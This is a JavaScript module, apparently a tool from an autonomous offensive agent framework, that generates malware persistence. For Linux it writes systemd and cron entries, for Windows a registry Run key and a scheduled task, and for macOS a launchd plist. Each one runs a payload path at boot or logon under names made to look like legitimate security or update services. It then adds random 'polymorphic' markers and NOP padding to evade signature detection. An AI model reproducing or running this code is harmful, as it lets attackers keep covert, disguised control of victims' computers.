import { createSubsystemLogger } from "../logging/subsystem.js";
const log = createSubsystemLogger("tools/persistence");
/**
 * Persistence Catalyst: Generates OS-specific persistence mechanisms to survive reboots.
 */
export async function synthesizePersistence(context) {
    log.info(`Synthesizing persistence foothold on ${context.target_os} via ${context.technique}...`);
    let mechanism = "";
    switch (context.target_os) {
        case "linux":
            if (context.technique === "systemd") {
                mechanism = `
[Unit]
Description=System Security Backup Service
After=network.target

[Service]
ExecStart=${context.payload_path}
Restart=always
RestartSec=10
Environment=NODE_ENV=production
WorkingDirectory=${context.payload_path.substring(0, context.payload_path.lastIndexOf('/'))}

[Install]
WantedBy=multi-user.target
                `.trim();
            }
            else if (context.technique === "cron") {
                mechanism = `@reboot ${context.payload_path}`;
            }
            break;
        case "windows":
            if (context.technique === "registry") {
                mechanism = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "${context.payload_path}" /f`;
            }
            else if (context.technique === "schtasks") {
                mechanism = `schtasks /create /tn "MicrosoftEdgeUpdate" /tr "${context.payload_path}" /sc onlogon /rl highest /f`;
            }
            break;
        case "macos":
            if (context.technique === "launchd") {
                const label = "com.apple.security.services.check";
                mechanism = `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${context.payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
                `.trim();
            }
            break;
    }
    if (!mechanism) {
        log.warn(`Technique ${context.technique} not supported for ${context.target_os}. Falling back to default.`);
        mechanism = `# Default fallback: run ${context.payload_path} manually.`;
    }
    // 4. Polymorphic Obfuscation (Autonomous Sovereign Feature)
    const polyId = Math.random().toString(36).substring(2, 8);
    const polyPadding = Buffer.alloc(Math.floor(Math.random() * 128), 0x90).toString('hex');
    // Inject non-functional but unique markers into the scripts
    if (mechanism.startsWith('<?xml')) {
        mechanism = mechanism.replace('</dict>', `<key>SovereignId</key><string>${polyId}</string></dict>`);
    }
    else if (mechanism.includes('[Unit]')) {
        mechanism += `\n# PolySignature: ${polyId}-${polyPadding}`;
    }
    else {
        mechanism += ` && echo "Sovereign Trace: ${polyId}" > /dev/null`;
    }
    log.info(`Persistence mechanism synthesized with polymorphic signature: ${polyId}`);
    return {
        status: "success",
        os: context.target_os,
        technique: context.technique,
        sovereign_id: polyId,
        deployment_script: mechanism,
        stealth_rating: "ULTIMATE",
        message: "Polymorphic persistence foothold generated. Signature is unique for this execution."
    };
}
//# sourceMappingURL=persistence.js.map